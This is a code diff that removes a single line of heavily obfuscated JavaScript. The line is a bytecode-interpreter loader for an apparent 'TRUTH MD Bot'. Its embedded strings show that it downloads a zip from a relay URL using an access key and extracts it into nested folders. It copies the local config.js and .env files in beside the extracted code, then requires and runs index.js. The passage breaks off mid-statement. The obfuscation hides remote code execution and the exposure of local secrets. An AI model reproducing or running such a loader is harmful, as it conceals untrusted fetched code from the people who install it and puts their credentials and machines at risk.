@@ -1,1 +1,1591 @@
-import vmR from'fs';import vmN from'path';import vmO from'axios';import vmS from'adm-zip';import{fileURLToPath}from'url';import{createRequire}from'module';let vmk=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?window:global,vmQ=Object['defineProperty'],vmc=Object['create'],vmX=Object['getOwnPropertyDescriptor'],vmz=Object['getOwnPropertyNames'],vmo=Object['getOwnPropertySymbols'],vmM=Object['setPrototypeOf'],vmh=Object['getPrototypeOf'],vmJ_a0ee8c=vmk['vmJ_a0ee8c']||(vmk['vmJ_a0ee8c']={});const vmp_a09bf9=(function(){let i=[{'i':[0xd3,0x0,0x7,0x0,0x0,0x1,0x7,0x1,0x6,0x1,0xd3,0x2,0x2c,null,0x34,null,0x4b,0x3,0x4,null,0x46,0x4,0x6,0x0,0x1b,null,0x1b,null,0x0,0x5,0x6,0x1,0x1d,null,0xa,null,0x1b,null,0x1b,null,0x0,0x6,0x37,0x2,0x4,null,0x7,0x0,0x3,null,0x6,0x1,0x1c,null,0x4,null,0x10,null,0x7,0x1,0x3,null,0x32,null,0x4b,0x3,0x4,null,0x46,0x4,0x6,0x0,0x1b,null,0x1b,null,0x0,0x7,0x1b,null,0x1b,null,0x0,0x6,0x37,0x2,0x7,0x2,0x4b,0x8,0x4,null,0x46,0x9,0x6,0x2,0x1b,null,0x1b,null,0x4d,null,0x4,null,0x0,0xa,0x47,0xb,0x3,null,0x1b,null,0x1b,null,0x0,0x6,0x37,0x2,0x3,null,0x6,0x2,0x38,null],'c':['baseFolder',0x0,'DEEP_NEST_COUNT','path','join','core',0x2,'lib_signals','fs','mkdirSync',!![],'recursive'],'p':0x0,'l':0x3,'j':[null,null,null,null,null,null,null,0x20,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x4],'sp':0x1},{'i':[0x3a,null,0x4b,0x0,0x4,null,0x46,0x1,0x0,0x2,0x1b,null,0x1b,null,0x0,0x3,0x37,0x1,0x3,null,0x4b,0x4,0x4,null,0x46,0x5,0xd3,0x6,0x1b,null,0x1b,null,0x4d,null,0x4,null,0x0,0x7,0x47,0x8,0x3,null,0x4,null,0x4d,null,0x4,null,0xd3,0x9,0x47,0xa,0x3,null,0x4,null,0x0,0xb,0x47,0xc,0x3,null,0x47,0xd,0x3,null,0x4,null,0x0,0xe,0x47,0xf,0x3,null,0x1b,null,0x1b,null,0x0,0x10,0x37,0x2,0x7a,null,0x7,0x1,0x4b,0x11,0x4b,0x12,0x4,null,0x46,0x13,0x6,0x1,0x46,0x14,0x1b,null,0x1b,null,0x0,0x3,0x37,0x1,0x0,0x3,0x68,0x1,0x7,0x2,0x6,0x2,0x4,null,0x46,0x15,0x8,0x0,0x1b,null,0x1b,null,0x0,0x16,0x1b,null,0x1b,null,0x0,0x10,0x37,0x2,0x3,null,0x4b,0x0,0x4,null,0x46,0x1,0x0,0x17,0x1b,null,0x1b,null,0x0,0x3,0x37,0x1,0x3,null,0x3b,null,0x32,null,0xd5,0x0,0xd2,0x0,0x3c,0x18,0x4b,0x0,0x4,null,0x46,0x19,0x0,0x1a,0x1b,null,0x1b,null,0xd3,0x18,0x46,0x1b,0x4e,0x1c,0x4,null,0x33,null,0x3,null,0xd3,0x18,0x46,0x1d,0x1b,null,0x1b,null,0x0,0x10,0x37,0x2,0x3,null,0x4b,0x1e,0x4,null,0x46,0x1f,0x0,0x3,0x1b,null,0x1b,null,0x0,0x3,0x37,0x1,0x3,null,0xd6,0x0,0x32,null,0x1,null,0x38,null],'c':['console','log','🔄\x20Syncing\x20codes\x20from\x20secure\x20relay...',0x1,'axios','get','VERCEL_RELAY_URL','arraybuffer','responseType','ACCESS_KEY','x-access-key','truth-md-loader','User-Agent','headers',0x4e20,'timeout',0x2,'AdmZip','Buffer','from','data','extractAllTo',!![],'✅\x20Codes\x20synced\x20successfully','_0x1e569e$$1','error','❌\x20Sync\x20failed:','response','status','message','process','exit'],'p':0x1,'l':0x2,'j':[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x70,null,null,null,null,null,null,null,null,null,null,null,null,null,0x60,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x70],'x':[[0x4f,-0x1,0x70]],'s':0x1,'sp':0x1},{'i':[0x4b,0x0,0x4,null,0x46,0x1,0xd3,0x2,0x1b,null,0x1b,null,0x0,0x3,0x1b,null,0x1b,null,0x0,0x4,0x37,0x2,0x7,0x1,0x4b,0x0,0x4,null,0x46,0x1,0xd3,0x2,0x1b,null,0x1b,null,0x0,0x5,0x1b,null,0x1b,null,0x0,0x4,0x37,0x2,0x7,0x2,0x3a,null,0x4b,0x6,0x4,null,0x46,0x7,0x6,0x1,0x1b,null,0x1b,null,0x0,0x8,0x37,0x1,0x34,null,0x4b,0x6,0x4,null,0x46,0x9,0x6,0x1,0x1b,null,0x1b,null,0x4b,0x0,0x4,null,0x46,0x1,0x8,0x0,0x1b,null,0x1b,null,0x0,0x3,0x1b,null,0x1b,null,0x0,0x4,0x37,0x2,0x1b,null,0x1b,null,0x0,0x4,0x37,0x2,0x3,null,0x4b,0xa,0x4,null,0x46,0xb,0x0,0xc,0x1b,null,0x1b,null,0x0,0x8,0x37,0x1,0x3,null,0x3b,null,0x32,null,0x3c,-0x1,0x4b,0xa,0x4,null,0x46,0xd,0x0,0xe,0x1b,null,0x1b,null,0x0,0x8,0x37,0x1,0x3,null,0x32,null,0x3a,null,0x4b,0x6,0x4,null,0x46,0x7,0x6,0x2,0x1b,null,0x1b,null,0x0,0x8,0x37,0x1,0x34,null,0x4b,0x6,0x4,null,0x46,0x9,0x6,0x2,0x1b,null,0x1b,null,0x4b,0x0,0x4,null,0x46,0x1,0x8,0x0,0x1b,null,0x1b,null,0x0,0x5,0x1b,null,0x1b,null,0x0,0x4,0x37,0x2,0x1b,null,0x1b,null,0x0,0x4,0x37,0x2,0x3,null,0x4b,0xa,0x4,null,0x46,0xb,0x0,0xf,0x1b,null,0x1b,null,0x0,0x8,0x37,0x1,0x3,null,0x3b,null,0x32,null,0x3c,-0x1,0x4b,0xa,0x4,null,0x46,0xd,0x0,0x10,0x1b,null,0x1b,null,0x0,0x8,0x37,0x1,0x3,null,0x32,null,0x1,null,0x38,null],'c':['path','join','__dirname','config.js',0x2,'.env','fs','existsSync',0x1,'copyFileSync','console','log','✅\x20config.js\x20copied','warn','⚠️\x20config.js\x20not\x20copied','✅\x20.env\x20copied','⚠️\x20.env\x20not\x20copied'],'p':0x1,'l':0x2,'j':[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x41,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x4e,null,null,null,null,null,null,null,null,null,null,0x4e,null,null,null,null,null,null,null,null,null,0x77,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x84,null,null,null,null,null,null,null,null,null,null,0x84],'x':[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[0x43,-0x1,0x4e],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[0x79,-0x1,0x84]],'sp':0x1},{'i':[0xd5,0x0,0xd2,0x0,0x4b,0x0,0x4,null,0x46,0x1,0x4b,0x2,0x4,null,0x46,0x3,0xd3,0x4,0x1b,null,0x1b,null,0x8,0x0,0x1b,null,0x1b,null,0x0,0x5,0x37,0x2,0x1b,null,0x1b,null,0x0,0x6,0x37,0x1,0x4,null,0x46,0x7,0x0,0x8,0x37,0x0,0x38,null],'c':['fs','statSync','path','join','_0x46c85a',0x2,0x1,'isDirectory',0x0],'p':0x1,'l':0x0,'a':0x1,'sp':0x1},{'i':[0xd5,0x0,0xd2,0x0,0xda,0x0,0xd3,0x1,0x0,0x2,0x36,0x0,0xd9,0x0,0xd3,0x0,0xd3,0x3,0x0,0x4,0x36,0x1,0x7a,null,0x3,null,0x4b,0x5,0x4,null,0x46,0x6,0xd3,0x0,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x4,null,0x46,0x7,0x0,0x8,0x64,null,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x7,0x1,0x6,0x1,0x46,0x9,0x20,null,0x34,null,0x4b,0xa,0x4,null,0x46,0xb,0x0,0xc,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0x4b,0xd,0x4,null,0x46,0xe,0x0,0x4,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0x4b,0xf,0x4,null,0x46,0x10,0xd3,0x0,0x1b,null,0x1b,null,0x6,0x1,0x0,0x2,0x48,null,0x1b,null,0x1b,null,0x0,0x11,0x37,0x2,0x7,0x2,0x6,0x2,0xd3,0x12,0x0,0x4,0x36,0x1,0x3,null,0x4b,0xf,0x4,null,0x46,0x10,0x6,0x2,0x1b,null,0x1b,null,0x0,0x13,0x1b,null,0x1b,null,0x0,0x14,0x1b,null,0x1b,null,0x0,0x15,0x37,0x3,0x7,0x3,0x4b,0x5,0x4,null,0x46,0x16,0x6,0x3,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x20,null,0x34,null,0x4b,0xa,0x4,null,0x46,0x17,0x0,0x18,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0x32,null,0x4b,0xa,0x4,null,0x46,0x19,0x0,0x1a,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0x3a,null,0x4b,0xa,0x4,null,0x46,0x19,0x0,0x1b,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0x4b,0xd,0x4,null,0x46,0x1c,0x6,0x2,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0x4b,0xf,0x4,null,0x46,0x10,0x6,0x2,0x1b,null,0x1b,null,0x0,0x1d,0x1b,null,0x1b,null,0x0,0x11,0x37,0x2,0xd3,0x1e,0x0,0x4,0x36,0x1,0x3,null,0x3b,null,0x32,null,0xd5,0x0,0xd2,0x0,0x3c,0x1f,0x4b,0xa,0x4,null,0x46,0xb,0x0,0x20,0x1b,null,0x1b,null,0xd3,0x1f,0x46,0x21,0x1b,null,0x1b,null,0x0,0x11,0x37,0x2,0x3,null,0x4b,0xd,0x4,null,0x46,0xe,0x0,0x4,0x1b,null,0x1b,null,0x0,0x4,0x37,0x1,0x3,null,0xd6,0x0,0x32,null,0xd6,0x0,0x1,null,0x38,null],'c':['_0x46c85a','createDeepRepoPath',0x0,'downloadAndExtractRepo',0x1,'fs','readdirSync','filter',0x3,'length','console','error','❌\x20ZIP\x20extracted\x20nothing','process','exit','path','join',0x2,'copyConfigs','lib','configdb.js',0x3,'existsSync','warn','⚠️\x20lib/configdb.js\x20not\x20found\x20(non-fatal)','log','✅\x20lib/configdb.js\x20exists','[🚀]\x20Launching\x20TRUTH\x20MD\x20Bot...','chdir','index.js','require','_0x1d02b4$$1','❌\x20TRUTH\x20MD\x20launch\x20error:','message'],'p':0x0,'l':0x4,'j':[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x34,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0x6a,null,null,null,null,null,null,null,null,null,0x73,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0xb2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,0xb2],'x':[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[0x97,-0x1,0xb2]],'s':0x1,'sp':0x1}],d=(function(){let V=i;i=null;let I=null;for(let H=0x0;H<V['length'];H++){let Z=V[H];if(Z&&Z['c'])for(let A=0x0;A<Z['c']['length'];A++){let D=Z['c'][A];if(typeof D==='string'&&D['length']>0x1&&D[D['length']-0x1]==='n')try{Z['c'][A]=BigInt(D['slice'](0x0,-0x1));}catch(K){}}}if(I){let t={};return function(q){let i0=I[q];if(i0 in t)return t[i0];return t[i0]=V[i0],V[i0]=null,t[i0];};}return function(q){return V[q];};}()),u={'0':0x1d3,'1':0xf8,'2':0x5b,'3':0x1bd,'4':0x1b9,'5':0x89,'6':0xc9,'7':0x2e,'8':0xe8,'9':0x1af,'10':0xd3,'11':0x59,'12':0x10b,'13':0x19b,'14':0x1,'15':0x57,'16':0x105,'17':0x12e,'18':0xb1,'19':0xa4,'20':0x1cd,'21':0x1a,'22':0x1c2,'23':0x17e,'24':0x1bf,'25':0x83,'26':0x69,'27':0x1be,'28':0x10a,'29':0x93,'32':0x170,'40':0xd5,'41':0xd6,'42':0x11b,'43':0x62,'44':0x95,'45':0x6b,'46':0xbf,'47':0x17c,'50':0xb4,'51':0x111,'52':0x37,'53':0x49,'54':0x96,'55':0x19d,'56':0x23,'57':0x88,'58':0x7a,'59':0x6,'60':0xd1,'61':0xfb,'62':0x1d2,'63':0x97,'64':0x195,'65':0x4d,'70':0x169,'71':0x182,'72':0xda,'73':0xb6,'74':0x13e,'75':0x16c,'76':0x159,'77':0x180,'78':0x7,'79':0x36,'80':0x151,'81':0xf5,'82':0x4f,'83':0x11a,'84':0x117,'90':0xde,'91':0x153,'92':0x53,'93':0x9d,'94':0x1b3,'95':0x10e,'100':0x1d5,'101':0x1b8,'102':0xe0,'103':0x1c4,'104':0x64,'105':0x178,'106':0x1c5,'107':0xc0,'110':0x48,'111':0xe4,'112':0xa2,'120':0x10c,'121':0x31,'122':0x1d0,'123':0x129,'124':0x65,'125':0x18e,'126':0x16e,'127':0x40,'128':0x1ec,'129':0x4c,'130':0xdf,'131':0x1f2,'132':0x70,'140':0x15,'141':0x1a7,'142':0x135,'143':0x136,'144':0x8c,'145':0x101,'146':0x26,'147':0x189,'148':0x1e2,'149':0x112,'150':0x1ff,'151':0x1ba,'152':0x1de,'153':0x11c,'154':0xf3,'155':0x114,'156':0xd4,'157':0x6e,'158':0x61,'160':0x1a2,'161':0x32,'162':0x5e,'163':0x50,'164':0x34,'165':0x35,'166':0x198,'167':0x171,'168':0x133,'169':0x160,'180':0x121,'181':0x1cc,'182':0x176,'183':0x168,'184':0x1a0,'185':0x84,'200':0x116,'201':0x54,'202':0x5a,'210':0xf,'211':0x128,'212':0x110,'213':0x45,'214':0x152,'215':0x118,'216':0xe6,'217':0x1ed,'218':0x140,'219':0x17,'220':0x1f,'250':0xf9,'251':0x90,'252':0x1c1,'253':0x85,'254':0xbe,'255':0xbd,'256':0x16f,'257':0xe7,'258':0x161,'259':0xba,'260':0x10,'261':0xeb};const w={},p=0x1,E=0x2,Y=0x3,g=0x4,J=0x78,v=0x79,n=0x7a,k=typeof 0x0n,a=Object['freeze']([]);let b=new WeakSet(),Q=new WeakSet();function c(V,I,H){try{vmQ(V,I,H);}catch(Z){}}function X(V,I){let H=new Array(I),Z=![];for(let D=I-0x1;D>=0x0;D--){let K=V();K&&typeof K==='object'&&b['has'](K)?(Z=!![],H[D]=K):H[D]=K;}if(!Z)return H;let A=[];for(let t=0x0;t<I;t++){let q=H[t];if(q&&typeof q==='object'&&b['has'](q)){let i0=q['value'];if(Array['isArray'](i0)){for(let i1=0x0;i1<i0['length'];i1++)A['push'](i0[i1]);}}else A['push'](q);}return A;}function z(V){let I=[];for(let H in V){I['push'](H);}return I;}function o(V){return Array['prototype']['slice']['call'](V);}function M(V){return typeof V==='function'&&V['prototype']?V['prototype']:V;}function h(V){if(typeof V==='function')return vmh(V);let I=vmh(V),H=I&&I['constructor']&&(I['constructor']['prototype']===I||vmh(I['constructor']['prototype'])===vmh(I));if(H)return vmh(I);return I;}function G(V,I){let H=V;while(H!==null){let Z=vmX(H,I);if(Z)return{'desc':Z,'proto':H};H=vmh(H);}return{'desc':null,'proto':V};}function R(V,I){if(!V['_$B27Lwo'])return;I in V['_$B27Lwo']&&delete V['_$B27Lwo'][I];let H=I['indexOf']('$$');if(H!==-0x1){let Z=I['substring'](0x0,H);Z in V['_$B27Lwo']&&delete V['_$B27Lwo'][Z];}}function N(V,I){let H=V;while(H){R(H,I),H=H['_$bXCHhp'];}}function O(V,I,H,Z){if(Z){let A=Reflect['set'](V,I,H);if(!A)throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(I)+'\x27\x20of\x20object');}else Reflect['set'](V,I,H);}function S(){return!vmJ_a0ee8c['_$tvcbbp']&&(vmJ_a0ee8c['_$tvcbbp']=new Map()),vmJ_a0ee8c['_$tvcbbp'];}function l(){return vmJ_a0ee8c['_$tvcbbp']||null;}function x(V,I,H){if(V['ni']===undefined||!H)return;let Z=V['c'][V['ni']];I['_$xk0pxV'][Z]=H,V['nfe']&&(!I['_$MnyFC1']&&(I['_$MnyFC1']={}),I['_$MnyFC1'][Z]=!![]),c(H,'name',{'value':Z,'writable':![],'enumerable':![],'configurable':!![]});}function r(V){return'_$YjFctj'+V['substring'](0x1)+'_$ur5Wop';}function s(V){return'_$0KTMKI'+V['substring'](0x1)+'_$LXBHEb';}function C(V,I,H,Z,A,D,K){let t;return A?t=function q(){let i0=I(arguments),i1=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];if(this===D)return V(H,i0,Z,t,i1,undefined);return V['call'](this,H,i0,Z,t,i1,K);}:t=function i0(){let i1=I(arguments),i2=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];return V['call'](this,H,i1,Z,t,i2,K);},t;}function P(V,I,H,Z,A,D,K){let t;return A?t=async function q(){let i0=I(arguments),i1=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];if(this===D)return await V(H,i0,Z,t,i1,undefined,undefined);return await V['call'](this,H,i0,Z,t,i1,undefined,K);}:t=async function i0(){let i1=I(arguments),i2=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];return await V['call'](this,H,i1,Z,t,i2,undefined,K);},t;}function B(V,I,H,Z,A,D,K,t){let q;return D?q=function i0(){let i1=I(arguments);if(this===K)return V(H,i1,Z,q,undefined,undefined);return V['call'](this,H,i1,Z,q,undefined,t);}:q=function i1(){let i2=I(arguments);return V['call'](this,H,i2,Z,q,undefined,t);},A['add'](q),q;}function F(V,I,H,Z){let A;return A={'rlsLCE':(...D)=>{return V(I,D,H,A,undefined,Z);}}['rlsLCE'],A;}function j(V,I,H,Z){let A;return A={'rlsLCE':async(...D)=>{return await V(I,D,H,A,undefined,undefined,Z);}}['rlsLCE'],A;}function y(V,I,H,Z,A,D,K){let t;return A?t={'rlsLCE'(){let q=I(arguments),i0=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];if(this===D)return V(H,q,Z,t,i0,undefined);return V['call'](this,H,q,Z,t,i0,K);}}['rlsLCE']:t={'rlsLCE'(){let q=I(arguments),i0=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];return V['call'](this,H,q,Z,t,i0,K);}}['rlsLCE'],t;}function U(V,I,H,Z,A,D,K){let t;return A?t={async 'rlsLCE'(){let q=I(arguments),i0=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];if(this===D)return await V(H,q,Z,t,i0,undefined,undefined);return await V['call'](this,H,q,Z,t,i0,undefined,K);}}['rlsLCE']:t={async 'rlsLCE'(){let q=I(arguments),i0=new.target!==undefined?new.target:vmJ_a0ee8c['_$tFZE09'];return await V['call'](this,H,q,Z,t,i0,undefined,K);}}['rlsLCE'],t;}function T(V,I,H,Z,A,D){let K=[],t=0x0,q=new Array((V['p']||0x0)+(V['l']||0x0)),i0=0x0,i1=V['c'],i2=V['i'],i3=V['j']||a,i4=V['x']||a,i5=i2['length']>>0x1,i6=[],i7=null,i8={['_$01ziIx']:![],['_$BtMLgv']:undefined},i9={['_$6MmH4c']:![],['_$5TjbWq']:0x0},ii={['_$Or4AH1']:![],['_$TTuHhF']:0x0},id=V['o']||u,iu=!!V['st'],iw=!!V['sp'],ip=!!V['dc'],iE=!!V['nte'],iY=D,ig=!!V['a'];!iu&&!ig&&(D===undefined||D===null)&&(D=vmk);var iJ=0x0,iv=null,ik=null;let ia=V['seKey'],ib,iQ,ic,iX,iz,io;if(ia!==undefined){let iy=iU=>typeof iU==='number'&&Number['isFinite'](iU)&&Number['isInteger'](iU)&&iU>=-0x80000000&&iU<=0x7fffffff&&!Object['is'](iU,-0x0)?iU^ia|0x0:iU;ib=iU=>{K[t++]=iy(iU);},iQ=()=>iy(K[--t]),ic=()=>iy(K[t-0x1]),iX=iU=>{K[t-0x1]=iy(iU);},iz=iU=>iy(K[t-iU]),io=(iU,iT)=>{K[t-iU]=iy(iT);};}else ib=iU=>{K[t++]=iU;},iQ=()=>K[--t],ic=()=>K[t-0x1],iX=iU=>{K[t-0x1]=iU;},iz=iU=>K[t-iU],io=(iU,iT)=>{K[t-iU]=iT;};let iM=iU=>iU,ih={['_$bXCHhp']:H,['_$xk0pxV']:vmc(null)};if(I)for(let iU=0x0;iU<Math['min'](I['length'],V['p']||0x0);iU++){q[iU]=I[iU];}let iG=iu&&I?o(I):null,iR=null,iN=![];iE&&(!ih['_$B27Lwo']&&(ih['_$B27Lwo']=vmc(null)),ih['_$B27Lwo']['__this__']=!![]);x(V,ih,Z);while(i0<i5){try{while(i0<i5){let iT=i0<<0x1,iW=i2[iT],im=i2[iT+0x1];if(!ij)var iO=![],iS,il=![],ix=![],ir=![],is=![],iC=![],iP=undefined,iB=null,iF=null,ij=[function(iL){d7:{K[t++]=i1[iL],i0++;}},function(iL){d7:{K[t++]=undefined,i0++;}},function(iL){d7:{K[t++]=null,i0++;}},function(iL){d7:{K[--t],i0++;}},function(iL){d7:{let iV=K[t-0x1];K[t++]=iV,i0++;}},function(iL){d7:{let iV=K[t-0x1];K[t-0x1]=K[t-0x2],K[t-0x2]=iV,i0++;}},function(iL){d7:{K[t++]=q[iL],i0++;}},function(iL){d7:{q[iL]=K[--t],i0++;}},function(iL){d7:{K[t++]=I[iL],i0++;}},function(iL){d7:{I[iL]=K[--t],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI+iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI-iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI*iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI/ iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI%iV,i0++;}},function(iL){d7:{K[t-0x1]=-K[t-0x1],i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=typeof iV===k?iV+0x1n:+iV+0x1,i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=typeof iV===k?iV-0x1n:+iV-0x1,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI**iV,i0++;}},function(iL){d7:{K[t-0x1]=+K[t-0x1],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI&iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI|iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI^iV,i0++;}},function(iL){d7:{K[t-0x1]=~K[t-0x1],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI<<iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI>>iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI>>>iV,i0++;}},function(iL){d7:{let iV=K[t-0x3],iI=K[t-0x2],ie=K[t-0x1];K[t-0x3]=iI,K[t-0x2]=ie,K[t-0x1]=iV,i0++;}},function(iL){d7:{let iV=K[--t];K[t++]=typeof iV===k?iV:+iV,i0++;}},function(iL){d7:{K[t-0x1]=String(K[t-0x1]),i0++;}},,,function(iL){d7:{K[t-0x1]=!K[t-0x1],i0++;}},,,,,,,,function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI==iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI!=iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI===iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI!==iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI<iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI<=iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI>iV,i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t];K[t++]=iI>=iV,i0++;}},,,function(iL){d7:{i0=iM(i3[i0]);}},function(iL){d7:{K[--t]?i0=iM(i3[i0]):i0++;}},function(iL){d7:{!K[--t]?i0=iM(i3[i0]):i0++;}},function(iL){d7:{let iV=K[--t];iV!==null&&iV!==undefined?i0=iM(i3[i0]):i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=vmJ_a0ee8c['_$eT2ZGH'];vmJ_a0ee8c['_$eT2ZGH']=undefined;try{let iH=iI['apply'](undefined,X(iQ,iV));K[t++]=iH;}finally{vmJ_a0ee8c['_$eT2ZGH']=ie;}i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=K[--t];if(typeof iI!=='function')throw new TypeError(iI+'\x20is\x20not\x20a\x20function');let iH=vmJ_a0ee8c['_$FWZbSq'],iZ=iH&&iH['get'](iI),iA=vmJ_a0ee8c['_$eT2ZGH'];iZ&&(vmJ_a0ee8c['_$ZQtJCU']=!![],vmJ_a0ee8c['_$eT2ZGH']=iZ);try{let iD=iI['apply'](ie,X(iQ,iV));K[t++]=iD;}finally{iZ&&(vmJ_a0ee8c['_$ZQtJCU']=![],vmJ_a0ee8c['_$eT2ZGH']=iA);}i0++;}},function(iL){d7:{if(i6['length']>0x0){let iV=i6[i6['length']-0x1];if(iV['_$At0dut']!==undefined){i8['_$01ziIx']=!![],i8['_$BtMLgv']=K[--t],i0=iV['_$At0dut'];break d7;}}i8['_$01ziIx']&&(i8['_$01ziIx']=![],i8['_$BtMLgv']=undefined);iO=!![],iS=K[--t];return;}},function(iL){d7:{throw K[--t];}},function(iL){d7:{let iV=i4[i0];i6['push']({['_$8iJwHv']:iV[0x0]>=0x0?iM(iV[0x0]):undefined,['_$At0dut']:iV[0x1]>=0x0?iM(iV[0x1]):undefined,['_$zj9zHS']:iV[0x2]>=0x0?iM(iV[0x2]):undefined,['_$czTq5L']:t}),i0++;}},function(iL){d7:{i6['pop'](),i0++;}},function(iL){d7:{let iV=K[--t];if(iL!=null){let iI=i1[iL];iF['_$xk0pxV'][iI]=iV;}i0++;}},function(iL){d7:{if(i6['length']>0x0){let iV=i6[i6['length']-0x1];iV['_$At0dut']===i0&&(iV['_$pdsKoy']!==undefined&&(i7=iV['_$pdsKoy']),i6['pop']());}i0++;}},function(iL){d7:{if(i8['_$01ziIx']){let iV=i8['_$BtMLgv'];i8['_$01ziIx']=![],i8['_$BtMLgv']=undefined,iO=!![],iS=iV;return;}if(i9['_$6MmH4c']){let iI=i9['_$5TjbWq'];i9['_$6MmH4c']=![],i9['_$5TjbWq']=0x0,i0=iI;break d7;}if(ii['_$Or4AH1']){let ie=ii['_$TTuHhF'];ii['_$Or4AH1']=![],ii['_$TTuHhF']=0x0,i0=ie;break d7;}if(i7!==null){let iH=i7;i7=null;throw iH;}i0++;}},function(iL){d7:{let iV=iM(i3[i0]);if(i6['length']>0x0){let iI=i6[i6['length']-0x1];if(iI['_$At0dut']!==undefined&&iV>=iI['_$zj9zHS']){i9['_$6MmH4c']=!![],i9['_$5TjbWq']=iV,i0=iI['_$At0dut'];break d7;}}i0=iV;}},function(iL){d7:{let iV=iM(i3[i0]);if(i6['length']>0x0){let iI=i6[i6['length']-0x1];if(iI['_$At0dut']!==undefined&&iV>=iI['_$zj9zHS']){ii['_$Or4AH1']=!![],ii['_$TTuHhF']=iV,i0=iI['_$At0dut'];break d7;}}i0=iV;}},,,,,,function(iL){d7:{let iV=K[--t],iI=i1[iL];if(iV===null||iV===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(iI)+'\x27\x20of\x20'+iV);K[t++]=iV[iI],i0++;}},function(iL){d7:{let iV=K[--t],iI=K[--t],ie=i1[iL];if(iI===null||iI===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(ie)+'\x27\x20of\x20'+iI);if(il){if(!Reflect['set'](iI,ie,iV))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(ie)+'\x27\x20of\x20object');}else 